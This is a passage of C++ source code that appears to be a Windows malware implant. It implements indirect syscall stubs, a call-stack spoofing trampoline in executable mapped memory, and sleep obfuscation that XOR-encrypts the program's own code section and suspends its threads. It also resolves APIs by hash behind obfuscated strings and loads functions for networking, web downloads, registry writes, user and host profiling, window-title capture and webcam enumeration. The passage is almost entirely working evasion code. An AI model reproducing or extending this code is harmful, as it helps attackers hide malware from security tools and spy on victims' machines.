        typedef NTSTATUS(WINAPI* fn_t)(PHANDLE, ACCESS_MASK, PVOID, PVOID);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(PHANDLE, ACCESS_MASK, PVOID, PVOID);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x10);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    NTSTATUS NtQuerySystemInformation(ULONG SystemInformationClass,
        PVOID SystemInformation, ULONG SystemInformationLength,
        PULONG ReturnLength)
    {
        SYSCALL_PREAMBLE("NtQuerySystemInformation", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(ULONG, PVOID, ULONG, PULONG);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(ULONG, PVOID, ULONG, PULONG);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x10);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
    NTSTATUS NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable,
        PLARGE_INTEGER Timeout)
    {
        SYSCALL_PREAMBLE("NtWaitForSingleObject", ssn, gadget);
        SYSCALL_EXEC_BEGIN();
#ifdef _WIN64
        typedef NTSTATUS(WINAPI* fn_t)(HANDLE, BOOLEAN, PLARGE_INTEGER);
        BUILD_SYSCALL_STUB(ssn, gadget, stub);
#else
        typedef NTSTATUS(__stdcall* fn_t)(HANDLE, BOOLEAN, PLARGE_INTEGER);
        BUILD_SYSCALL_STUB_X86(ssn, gadget, stub, 0x0C);
#endif
        SYSCALL_EXEC_COPY_AND_FLIP(stub);
        NTSTATUS result = ((fn_t)pExec)(Handle, Alertable, Timeout);
        SYSCALL_EXEC_CLEANUP(stub, result);
        return result;
    }
}

#include <windows.h>
namespace StackSpoof {
    static HANDLE  g_hSection     = NULL;
    static LPVOID  g_pTrampoline  = NULL;
    static LPVOID  g_targetFunc   = NULL;
    static bool    g_initialized  = false;
    static const SIZE_T TARGET_OFFSET    = 64;
    static const SIZE_T SAVED_RET_OFFSET = TARGET_OFFSET + 8;  
    bool Init() {
        if (g_initialized) return true;
        if (!Internal::_CreateFileMappingA || !Internal::_MapViewOfFile) {
            SLOG("[STACKSPOOF] Init FAILED: CreateFileMappingA=%p MapViewOfFile=%p",
                 Internal::_CreateFileMappingA, Internal::_MapViewOfFile);
            return false;
        }
#ifndef FILE_MAP_EXECUTE
#define FILE_MAP_EXECUTE 0x0020
#endif
        g_hSection = Internal::_CreateFileMappingA(
            INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE,
            0, 0x1000, NULL);
        if (!g_hSection) { SLOG("[STACKSPOOF] CreateFileMappingA FAILED"); return false; }
        SLOG("[STACKSPOOF] Section handle=%p", g_hSection);
        g_pTrampoline = Internal::_MapViewOfFile(g_hSection,
            FILE_MAP_WRITE | FILE_MAP_READ | FILE_MAP_EXECUTE,
            0, 0, 0x1000);
        if (!g_pTrampoline) { SLOG("[STACKSPOOF] MapViewOfFile FAILED"); return false; }
        SLOG("[STACKSPOOF] Trampoline mapped at %p", g_pTrampoline);
        volatile unsigned char* vp = (volatile unsigned char*)g_pTrampoline;
        for (int i = 0; i < 0x1000; i++) vp[i] = 0;
        *(LPVOID*)((BYTE*)g_pTrampoline + TARGET_OFFSET) = NULL;
#ifdef _WIN64
        unsigned char stub[] = {
            0x41, 0x5B,                                     
            0x4C, 0x89, 0x1D, 0x00, 0x00, 0x00, 0x00,     
            0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00,     
            0x4C, 0x8D, 0x1D, 0x00, 0x00, 0x00, 0x00,     
            0x41, 0x53,                                     
            0xFF, 0xE0,                                     
            0xFF, 0x25, 0x00, 0x00, 0x00, 0x00             
        };
        INT32 disp_save_ret = (INT32)(SAVED_RET_OFFSET - 9);   
        INT32 disp_target   = (INT32)(TARGET_OFFSET - 16);      
        INT32 disp_ret_lbl  = (INT32)(27 - 23);                 
        INT32 disp_jmp_back = (INT32)(SAVED_RET_OFFSET - 33);  
        memcpy(stub + 5,  &disp_save_ret, 4);
        memcpy(stub + 12, &disp_target, 4);
        memcpy(stub + 19, &disp_ret_lbl, 4);
        memcpy(stub + 29, &disp_jmp_back, 4);
        memcpy(g_pTrampoline, stub, sizeof(stub));
#else
        DWORD targetAbsAddr = (DWORD)((BYTE*)g_pTrampoline + TARGET_OFFSET);
        DWORD savedRetAddr  = (DWORD)((BYTE*)g_pTrampoline + TARGET_OFFSET + 4);
        DWORD retLabelAddr  = (DWORD)((BYTE*)g_pTrampoline + 14); 
        unsigned char stub[] = {
            0x59,                                       
            0x89, 0x0D, 0x00, 0x00, 0x00, 0x00,       
            0x68, 0x00, 0x00, 0x00, 0x00,              
            0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,        
            0xFF, 0x25, 0x00, 0x00, 0x00, 0x00         
        };
        retLabelAddr = (DWORD)((BYTE*)g_pTrampoline + 18);
        memcpy(stub + 3,  &savedRetAddr, 4);   
        memcpy(stub + 8,  &retLabelAddr, 4);   
        memcpy(stub + 14, &targetAbsAddr, 4);  
        memcpy(stub + 20, &savedRetAddr, 4);   
        memcpy(g_pTrampoline, stub, sizeof(stub));
#endif
        g_initialized = true;
        SLOG("[STACKSPOOF] Init OK — trampoline at %p", g_pTrampoline);
        return true;
    }
    LPVOID GetTrampoline() {
        return g_pTrampoline;
    }
    void SetTarget(LPVOID func) {
        *(LPVOID*)((BYTE*)g_pTrampoline + TARGET_OFFSET) = func;
    }
}

#include <windows.h>
#include <intrin.h>
#include <vector>

#ifndef SLEEPSEC_NAME
#define SLEEPSEC_NAME ".rsrc2"
#endif
#pragma comment(linker, "/SECTION:" SLEEPSEC_NAME ",ER")
#pragma code_seg(SLEEPSEC_NAME)
namespace SleepObf {
    typedef HANDLE(WINAPI* CreateEventW_t)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR);
    typedef BOOL(WINAPI* SetEvent_t)(HANDLE);
    typedef DWORD(WINAPI* WaitForSingleObject_t)(HANDLE, DWORD);
    typedef HANDLE(WINAPI* CreateThread_t)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    typedef BOOL(WINAPI* CloseHandle_t)(HANDLE);
    typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    static CreateEventW_t             g_CreateEventW = nullptr;
    static SetEvent_t                 g_SetEvent = nullptr;
    static WaitForSingleObject_t      g_WaitForSingleObject = nullptr;
    static CreateThread_t             g_CreateThread = nullptr;
    static CloseHandle_t              g_CloseHandle = nullptr;
    static NtProtectVirtualMemory_t   g_pNtProtect = nullptr;
    static bool                       g_initialized = false;
    struct DecryptCtx {
        PVOID  textBase;
        SIZE_T textSize;
        UCHAR  key[16];
        HANDLE hEvent;           
        NtProtectVirtualMemory_t pNtProtect;
        SetEvent_t               pSetEvent;
        WaitForSingleObject_t    pWFSO;
        CreateEventW_t           pCreateEventW;
        CloseHandle_t            pCloseHandle;
        DWORD  sleepMs;
        volatile LONG decrypted; 
    };
    static void XorBlock(PVOID base, SIZE_T size, const UCHAR* key, SIZE_T keyLen) {
        UCHAR* p = (UCHAR*)base;
        SIZE_T i = 0;
        if (keyLen == 16) {
            for (; i + 15 < size; i += 16) {
                for (SIZE_T j = 0; j < 16; j++)
                    p[i + j] ^= key[j];
            }
        }
        for (; i < size; i++)
            p[i] ^= key[i % keyLen];
    }
    static bool GetTextSection(PVOID* pBase, SIZE_T* pSize) {
        HMODULE hSelf = Internal::_GetModuleHandleA(NULL);
        if (!hSelf) return false;
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hSelf;
        PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((BYTE*)hSelf + pDos->e_lfanew);
        PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
        for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
            if (pSec[i].Name[0] == '.' && pSec[i].Name[1] == 't' &&
                pSec[i].Name[2] == 'e' && pSec[i].Name[3] == 'x' &&
                pSec[i].Name[4] == 't') {
                *pBase = (PVOID)((BYTE*)hSelf + pSec[i].VirtualAddress);
                *pSize = pSec[i].Misc.VirtualSize;
                return true;
            }
        }
        return false;
    }
    static std::vector<DWORD> SuspendOtherThreads() {
        std::vector<DWORD> suspended;
        DWORD currentPid = Internal::_GetCurrentProcessId();
        DWORD currentTid = Internal::_GetCurrentThreadId();
        auto _Snap    = (Resolver::CreateToolhelp32Snapshot_t)Resolver::GetAPIByHash(Resolver::HASH_KERNEL32, Resolver::HASH_CREATETOOLHELP32SNAPSHOT);
        auto _First   = (Resolver::Thread32First_t)Resolver::GetAPIByHash(Resolver::HASH_KERNEL32, Resolver::HASH_THREAD32FIRST);
        auto _Next    = (Resolver::Thread32Next_t)Resolver::GetAPIByHash(Resolver::HASH_KERNEL32, Resolver::HASH_THREAD32NEXT);
        auto _Open    = (Resolver::OpenThread_t)Resolver::GetAPIByHash(Resolver::HASH_KERNEL32, Resolver::HASH_OPENTHREAD);
        auto _Suspend = (Resolver::SuspendThread_t)Resolver::GetAPIByHash(Resolver::HASH_KERNEL32, Resolver::HASH_SUSPENDTHREAD);
        auto _Close   = (Resolver::CloseHandle_t)Resolver::GetAPIByHash(Resolver::HASH_KERNEL32, Resolver::HASH_CLOSEHANDLE);
        if (!_Snap || !_First || !_Next || !_Open || !_Suspend || !_Close)
            return suspended;
        HANDLE hSnap = _Snap(TH32CS_SNAPTHREAD, 0);
        if (hSnap == INVALID_HANDLE_VALUE) return suspended;
        THREADENTRY32 te;
        te.dwSize = sizeof(te);
        if (_First(hSnap, &te)) {
            do {
                if (te.th32OwnerProcessID == currentPid && te.th32ThreadID != currentTid) {
                    HANDLE hT = _Open(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                    if (hT) { _Suspend(hT); suspended.push_back(te.th32ThreadID); _Close(hT); }
                }
            } while (_Next(hSnap, &te));
        }
        _Close(hSnap);
        return suspended;
    }
    static void ResumeOtherThreads(const std::vector<DWORD>& tids) {
        auto _Open   = (Resolver::OpenThread_t)Resolver::GetAPIByHash(Resolver::HASH_KERNEL32, Resolver::HASH_OPENTHREAD);
        auto _Resume = (Resolver::ResumeThread_t)Resolver::GetAPIByHash(Resolver::HASH_KERNEL32, Resolver::HASH_RESUMETHREAD);
        auto _Close  = (Resolver::CloseHandle_t)Resolver::GetAPIByHash(Resolver::HASH_KERNEL32, Resolver::HASH_CLOSEHANDLE);
        if (!_Open || !_Resume || !_Close) return;
        for (DWORD tid : tids) {
            HANDLE hT = _Open(THREAD_SUSPEND_RESUME, FALSE, tid);
            if (hT) { _Resume(hT); _Close(hT); }
        }
    }
    static DWORD WINAPI DecryptThreadProc(LPVOID lpParam) {
        auto* ctx = (DecryptCtx*)lpParam;
        HANDLE hDummy = ctx->pCreateEventW(NULL, TRUE, FALSE, NULL);
        if (hDummy) {
            ctx->pWFSO(hDummy, ctx->sleepMs);
            ctx->pCloseHandle(hDummy);
        }
        PVOID  base = ctx->textBase;
        SIZE_T size = ctx->textSize;
        ULONG  old  = 0;
        ctx->pNtProtect((HANDLE)-1, &base, &size, PAGE_READWRITE, &old);
        XorBlock(ctx->textBase, ctx->textSize, ctx->key, 16);
        base = ctx->textBase; size = ctx->textSize;
        ctx->pNtProtect((HANDLE)-1, &base, &size, PAGE_EXECUTE_READ, &old);
        InterlockedExchange(&ctx->decrypted, 1);
        ctx->pSetEvent(ctx->hEvent);
        return 0;
    }
    bool Init() {
        if (g_initialized) return true;
        if (!Internal::_GetProcAddress || !Internal::_GetModuleHandleA) {
            SLOG("[SLEEPOBF] Init FAILED: GPA or GMH null");
            return false;
        }
        auto k32 = OBFS_S("kernel32.dll");
        HMODULE hK32 = Internal::_GetModuleHandleA(k32.c_str());
        if (!hK32) { SLOG("[SLEEPOBF] Init FAILED: kernel32 not found"); return false; }

        auto ceStr   = OBFS_S("CreateEventW");
        auto seStr   = OBFS_S("SetEvent");
        auto wfsoStr = OBFS_S("WaitForSingleObject");
        auto ctStr   = OBFS_S("CreateThread");
        auto chStr   = OBFS_S("CloseHandle");
        g_CreateEventW        = (CreateEventW_t)Internal::_GetProcAddress(hK32, ceStr.c_str());
        g_SetEvent            = (SetEvent_t)Internal::_GetProcAddress(hK32, seStr.c_str());
        g_WaitForSingleObject = (WaitForSingleObject_t)Internal::_GetProcAddress(hK32, wfsoStr.c_str());
        g_CreateThread        = (CreateThread_t)Internal::_GetProcAddress(hK32, ctStr.c_str());
        g_CloseHandle         = (CloseHandle_t)Internal::_GetProcAddress(hK32, chStr.c_str());
        SLOG("[SLEEPOBF] APIs: CE=%p SE=%p WFSO=%p CT=%p CH=%p",
             g_CreateEventW, g_SetEvent, g_WaitForSingleObject,
             g_CreateThread, g_CloseHandle);
        auto ntStr = OBFS_S("ntdll.dll");
        HMODULE hNt = Internal::_GetModuleHandleA(ntStr.c_str());
        if (hNt) {
            auto npStr = OBFS_S("NtProtectVirtualMemory");
            g_pNtProtect = (NtProtectVirtualMemory_t)Internal::_GetProcAddress(hNt, npStr.c_str());
        }
        SLOG("[SLEEPOBF] NtProtect=%p", g_pNtProtect);
        g_initialized = (g_CreateEventW && g_SetEvent && g_WaitForSingleObject &&
                         g_CreateThread && g_CloseHandle && g_pNtProtect);
        SLOG("[SLEEPOBF] Init result: %s", g_initialized ? "OK" : "FAILED");
        return g_initialized;
    }
    void ObfuscatedSleep(DWORD milliseconds) {
        if (milliseconds < 500 || !g_initialized) {
            SLOG("[SLEEPOBF] Short/fallback sleep %dms (init=%d)", milliseconds, g_initialized);
            LONGLONG delay = -(LONGLONG)milliseconds * 10000LL;
            Syscalls::NtDelayExecution(FALSE, &delay);
            return;
        }
        SLOG("[SLEEPOBF] ObfuscatedSleep(%dms) starting", milliseconds);
        PVOID textBase = NULL;
        SIZE_T textSize = 0;
        if (!GetTextSection(&textBase, &textSize) || textSize == 0) {
            SLOG("[SLEEPOBF] GetTextSection FAILED, fallback sleep");
            LONGLONG delay = -(LONGLONG)milliseconds * 10000LL;
            Syscalls::NtDelayExecution(FALSE, &delay);
            return;
        }
        SLOG("[SLEEPOBF] .text base=%p size=%zu", textBase, textSize);
        HANDLE hEvent = g_CreateEventW(NULL, FALSE, FALSE, NULL);
        if (!hEvent) {
            LONGLONG delay = -(LONGLONG)milliseconds * 10000LL;
            Syscalls::NtDelayExecution(FALSE, &delay);
            return;
        }
        UCHAR key[16];
        unsigned __int64 tsc1 = __rdtsc();
        unsigned __int64 tsc2 = __rdtsc();
        for (int i = 0; i < 8; i++) key[i]     = (UCHAR)(tsc1 >> (i * 8));
        for (int i = 0; i < 8; i++) key[8 + i]  = (UCHAR)(tsc2 >> (i * 8));
        ULONG_PTR stackAddr = (ULONG_PTR)&key;
        key[0] ^= (UCHAR)(stackAddr);
        key[7] ^= (UCHAR)(stackAddr >> 8);
        SLOG("[SLEEPOBF] Suspending other threads...");
        auto suspendedTids = SuspendOtherThreads();
        SLOG("[SLEEPOBF] Suspended %zu threads", suspendedTids.size());
        DecryptCtx dctx = {};
        dctx.textBase     = textBase;
        dctx.textSize     = textSize;
        memcpy(dctx.key, key, 16);
        dctx.hEvent       = hEvent;
        dctx.pNtProtect   = g_pNtProtect;
        dctx.pSetEvent    = g_SetEvent;
        dctx.pWFSO        = g_WaitForSingleObject;
        dctx.pCreateEventW = g_CreateEventW;
        dctx.pCloseHandle = g_CloseHandle;
        dctx.sleepMs      = milliseconds;
        dctx.decrypted    = 0;
        SLOG("[SLEEPOBF] Setup done, encrypting .text and sleeping %dms...", milliseconds);
        {
            PVOID  encBase = textBase;
            SIZE_T encSize = textSize;
            ULONG  encOld  = 0;
            g_pNtProtect((HANDLE)-1, &encBase, &encSize, PAGE_READWRITE, &encOld);
            XorBlock(textBase, textSize, key, 16);
            encBase = textBase; encSize = textSize;
            g_pNtProtect((HANDLE)-1, &encBase, &encSize, PAGE_NOACCESS, &encOld);
        }
        HANDLE hThread = g_CreateThread(NULL, 0, DecryptThreadProc, &dctx, 0, NULL);
        if (hThread) {
            g_WaitForSingleObject(hEvent, milliseconds + 5000);
        }
        if (InterlockedCompareExchange(&dctx.decrypted, 0, 0) == 0) {
            PVOID b = textBase; SIZE_T s = textSize; ULONG o = 0;
            g_pNtProtect((HANDLE)-1, &b, &s, PAGE_READWRITE, &o);
            XorBlock(textBase, textSize, key, 16);
            b = textBase; s = textSize;
            g_pNtProtect((HANDLE)-1, &b, &s, PAGE_EXECUTE_READ, &o);
        }
        SLOG("[SLEEPOBF] Wait returned, decrypted=%d", (int)dctx.decrypted);
        if (hThread) {
            g_WaitForSingleObject(hThread, 1000); 
            g_CloseHandle(hThread);
        }
        Internal::_CloseHandle(hEvent);
        volatile UCHAR* vk = (volatile UCHAR*)key;
        for (int i = 0; i < 16; i++) vk[i] = 0;
        volatile UCHAR* vc = (volatile UCHAR*)dctx.key;
        for (int i = 0; i < 16; i++) { vc[i] = 0; }
        SLOG("[SLEEPOBF] Resuming %zu threads...", suspendedTids.size());
        ResumeOtherThreads(suspendedTids);
        SLOG("[SLEEPOBF] ObfuscatedSleep completed OK");
    }
}
#pragma code_seg()

namespace Internal {
    Resolver::LoadLibraryA_t _LoadLibraryA = nullptr;
    Resolver::GetProcAddress_t _GetProcAddress = nullptr;
    Resolver::MultiByteToWideChar_t _MultiByteToWideChar = nullptr;
    Resolver::GetSystemInfo_t _GetSystemInfo = nullptr;
    Resolver::VirtualProtect_t _VirtualProtect = nullptr;
    Resolver::VirtualAlloc_t _VirtualAlloc = nullptr;
    Resolver::VirtualFree_t _VirtualFree = nullptr;
    Resolver::GetModuleHandleA_t _GetModuleHandleA = nullptr;
    Resolver::GetComputerNameA_t _GetComputerNameA = nullptr;
    Resolver::GetSystemDirectoryA_t _GetSystemDirectoryA = nullptr;
    Resolver::GetDiskFreeSpaceExA_t _GetDiskFreeSpaceExA = nullptr;
    Resolver::GlobalMemoryStatusEx_t _GlobalMemoryStatusEx = nullptr;
    Resolver::GetCurrentProcessId_t _GetCurrentProcessId = nullptr;
    Resolver::GetCurrentThreadId_t _GetCurrentThreadId = nullptr;
    Resolver::SetProcessWorkingSetSize_t _SetProcessWorkingSetSize = nullptr;
    Resolver::SetThreadExecutionState_t _SetThreadExecutionState = nullptr;
    Resolver::GetTickCount_t _GetTickCount = nullptr;
    Resolver::CreateMutexA_t _CreateMutexA = nullptr;
    Resolver::GetLastError_t _GetLastError = nullptr;
    Resolver::GetModuleFileNameA_t _GetModuleFileNameA = nullptr;
    Resolver::FileTimeToSystemTime_t _FileTimeToSystemTime = nullptr;
    Resolver::CreateFileA_t _CreateFileA = nullptr;
    Resolver::GetFileTime_t _GetFileTime = nullptr;
    Resolver::CloseHandle_t _CloseHandle = nullptr;
    Resolver::GetProcessHeap_t _GetProcessHeap = nullptr;
    Resolver::HeapAlloc_t _HeapAlloc = nullptr;
    Resolver::HeapFree_t _HeapFree = nullptr;
    Resolver::CreateFileMappingA_t _CreateFileMappingA = nullptr;
    Resolver::MapViewOfFile_t _MapViewOfFile = nullptr;
    Resolver::UnmapViewOfFile_t _UnmapViewOfFile = nullptr;
    Resolver::GetUserNameA_t _GetUserNameA = nullptr;
    Resolver::RegCreateKeyExA_t _RegCreateKeyExA = nullptr;
    Resolver::RegSetValueExA_t _RegSetValueExA = nullptr;
    Resolver::RegOpenKeyExA_t _RegOpenKeyExA = nullptr;
    Resolver::RegQueryValueExA_t _RegQueryValueExA = nullptr;
    Resolver::RegCloseKey_t _RegCloseKey = nullptr;
    Resolver::OpenProcessToken_t _OpenProcessToken = nullptr;
    Resolver::GetTokenInformation_t _GetTokenInformation = nullptr;
    Resolver::GetForegroundWindow_t _GetForegroundWindow = nullptr;
    Resolver::GetWindowTextA_t _GetWindowTextA = nullptr;
    Resolver::GetLastInputInfo_t _GetLastInputInfo = nullptr;
    Resolver::EnumDisplayDevicesA_t _EnumDisplayDevicesA = nullptr;
    Resolver::WSAStartup_t _WSAStartup = nullptr;
    Resolver::WSACleanup_t _WSACleanup = nullptr;
    Resolver::socket_t _socket = nullptr;
    Resolver::connect_t _connect = nullptr;
    Resolver::send_t _send = nullptr;
    Resolver::recv_t _recv = nullptr;
    Resolver::closesocket_t _closesocket = nullptr;
    Resolver::getaddrinfo_t _getaddrinfo = nullptr;
    Resolver::freeaddrinfo_t _freeaddrinfo = nullptr;
    Resolver::setsockopt_t _setsockopt = nullptr;
    Resolver::InternetOpenA_t _InternetOpenA = nullptr;
    Resolver::InternetOpenUrlA_t _InternetOpenUrlA = nullptr;
    Resolver::InternetReadFile_t _InternetReadFile = nullptr;
    Resolver::InternetCloseHandle_t _InternetCloseHandle = nullptr;
    Resolver::CryptStringToBinaryA_t _CryptStringToBinaryA = nullptr;
    Resolver::BCryptOpenAlgorithmProvider_t _BCryptOpenAlgorithmProvider = nullptr;
    Resolver::BCryptGetProperty_t _BCryptGetProperty = nullptr;
    Resolver::BCryptCreateHash_t _BCryptCreateHash = nullptr;
    Resolver::BCryptHashData_t _BCryptHashData = nullptr;
    Resolver::BCryptFinishHash_t _BCryptFinishHash = nullptr;
    Resolver::BCryptDestroyHash_t _BCryptDestroyHash = nullptr;
    Resolver::BCryptCloseAlgorithmProvider_t _BCryptCloseAlgorithmProvider = nullptr;
    Resolver::BCryptGenRandom_t _BCryptGenRandom = nullptr;
    Resolver::BCryptSetProperty_t _BCryptSetProperty = nullptr;
    Resolver::BCryptGenerateSymmetricKey_t _BCryptGenerateSymmetricKey = nullptr;
    Resolver::BCryptEncrypt_t _BCryptEncrypt = nullptr;
    Resolver::BCryptDecrypt_t _BCryptDecrypt = nullptr;
    Resolver::BCryptDestroyKey_t _BCryptDestroyKey = nullptr;
    Resolver::CoInitializeEx_t _CoInitializeEx = nullptr;
    Resolver::CoInitializeSecurity_t _CoInitializeSecurity = nullptr;
    Resolver::CoCreateInstance_t _CoCreateInstance = nullptr;
    Resolver::CoUninitialize_t _CoUninitialize = nullptr;
    Resolver::VariantClear_t _VariantClear = nullptr;
    Resolver::capGetDriverDescriptionA_t _capGetDriverDescriptionA = nullptr;
    Resolver::IsUserAnAdmin_t _IsUserAnAdmin = nullptr;
    static LPVOID ResolveKernelAPI(DWORD funcHash) {
        LPVOID addr = Resolver::GetAPIByHash(Resolver::HASH_KERNEL32, funcHash);
        if (!addr) addr = Resolver::GetAPIByHash(Resolver::HASH_KERNELBASE, funcHash);
        return addr;
    }
    static LPVOID ResolveViaGPA(const char* dllName, const char* funcName) {
        if (!_GetModuleHandleA || !_GetProcAddress) return NULL;
        HMODULE hMod = _GetModuleHandleA(dllName);
        if (!hMod && _LoadLibraryA) hMod = _LoadLibraryA(dllName);
        if (!hMod) return NULL;
        return (LPVOID)_GetProcAddress(hMod, funcName);
    }
    bool Initialize() {
        SLOG("[INTERNAL] Initialize() started");
        Resolver::InitRuntimeKeys();
        SLOG("[INTERNAL] InitRuntimeKeys OK");
        _LoadLibraryA = (Resolver::LoadLibraryA_t)ResolveKernelAPI(Resolver::HASH_LOADLIBRARYA);
        if (!_LoadLibraryA) { SLOG("[INTERNAL] LoadLibraryA resolve FAILED"); return false; }
        SLOG("[INTERNAL] LoadLibraryA resolved OK");
        _LoadLibraryA(OBFS_S("advapi32.dll").c_str());
        _LoadLibraryA(OBFS_S("user32.dll").c_str());
        _LoadLibraryA(OBFS_S("ws2_32.dll").c_str());
        _LoadLibraryA(OBFS_S("wininet.dll").c_str());
        _LoadLibraryA(OBFS_S("crypt32.dll").c_str());
        _LoadLibraryA(OBFS_S("bcrypt.dll").c_str());
        _LoadLibraryA(OBFS_S("ole32.dll").c_str());
        _LoadLibraryA(OBFS_S("oleaut32.dll").c_str());
        _LoadLibraryA(OBFS_S("vfw32.dll").c_str());
        _LoadLibraryA(OBFS_S("shell32.dll").c_str());
        _GetProcAddress = (Resolver::GetProcAddress_t)ResolveKernelAPI(Resolver::HASH_GETPROCADDRESS);
        _MultiByteToWideChar = (Resolver::MultiByteToWideChar_t)ResolveKernelAPI(Resolver::HASH_MULTIBYTETOWIDECHAR);
        _GetSystemInfo = (Resolver::GetSystemInfo_t)ResolveKernelAPI(Resolver::HASH_GETSYSTEMINFO);
        _VirtualProtect = (Resolver::VirtualProtect_t)ResolveKernelAPI(Resolver::HASH_VIRTUALPROTECT);
        _VirtualAlloc = (Resolver::VirtualAlloc_t)ResolveKernelAPI(Resolver::HASH_VIRTUALALLOC);
        _VirtualFree = (Resolver::VirtualFree_t)ResolveKernelAPI(Resolver::HASH_VIRTUALFREE);
        _GetModuleHandleA = (Resolver::GetModuleHandleA_t)ResolveKernelAPI(Resolver::HASH_GETMODULEHANDLEA);
        if (!_GetProcAddress || !_GetModuleHandleA || !_VirtualAlloc) {
            SLOG("[INTERNAL] Critical API resolve FAILED (GPA=%p GMH=%p VA=%p)", _GetProcAddress, _GetModuleHandleA, _VirtualAlloc);
            return false;
        }
        SLOG("[INTERNAL] Core APIs resolved OK");
        _GetComputerNameA = (Resolver::GetComputerNameA_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetComputerNameA").c_str()); 
        _GetSystemDirectoryA = (Resolver::GetSystemDirectoryA_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetSystemDirectoryA").c_str()); 
        _GetDiskFreeSpaceExA = (Resolver::GetDiskFreeSpaceExA_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetDiskFreeSpaceExA").c_str()); 
        _GlobalMemoryStatusEx = (Resolver::GlobalMemoryStatusEx_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GlobalMemoryStatusEx").c_str()); 
        _GetCurrentProcessId = (Resolver::GetCurrentProcessId_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetCurrentProcessId").c_str()); 
        _GetCurrentThreadId = (Resolver::GetCurrentThreadId_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetCurrentThreadId").c_str()); 
        _SetProcessWorkingSetSize = (Resolver::SetProcessWorkingSetSize_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("SetProcessWorkingSetSize").c_str()); 
        _SetThreadExecutionState = (Resolver::SetThreadExecutionState_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("SetThreadExecutionState").c_str()); 
        _GetTickCount = (Resolver::GetTickCount_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetTickCount").c_str()); 
        _CreateMutexA = (Resolver::CreateMutexA_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("CreateMutexA").c_str()); 
        _GetLastError = (Resolver::GetLastError_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetLastError").c_str()); 
        _GetModuleFileNameA = (Resolver::GetModuleFileNameA_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetModuleFileNameA").c_str()); 
        _FileTimeToSystemTime = (Resolver::FileTimeToSystemTime_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("FileTimeToSystemTime").c_str()); 
        _CreateFileA = (Resolver::CreateFileA_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("CreateFileA").c_str()); 
        _GetFileTime = (Resolver::GetFileTime_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetFileTime").c_str()); 
        _CloseHandle = (Resolver::CloseHandle_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("CloseHandle").c_str()); 
        _GetProcessHeap = (Resolver::GetProcessHeap_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetProcessHeap").c_str()); 
        _HeapAlloc = (Resolver::HeapAlloc_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("HeapAlloc").c_str()); 
        _HeapFree = (Resolver::HeapFree_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("HeapFree").c_str()); 
        _CreateFileMappingA = (Resolver::CreateFileMappingA_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("CreateFileMappingA").c_str()); 
        _MapViewOfFile = (Resolver::MapViewOfFile_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("MapViewOfFile").c_str()); 
        _UnmapViewOfFile = (Resolver::UnmapViewOfFile_t)ResolveViaGPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("UnmapViewOfFile").c_str());
        _GetUserNameA = (Resolver::GetUserNameA_t)ResolveViaGPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("GetUserNameA").c_str());
        _RegCreateKeyExA = (Resolver::RegCreateKeyExA_t)ResolveViaGPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("RegCreateKeyExA").c_str());
        _RegSetValueExA = (Resolver::RegSetValueExA_t)ResolveViaGPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("RegSetValueExA").c_str());
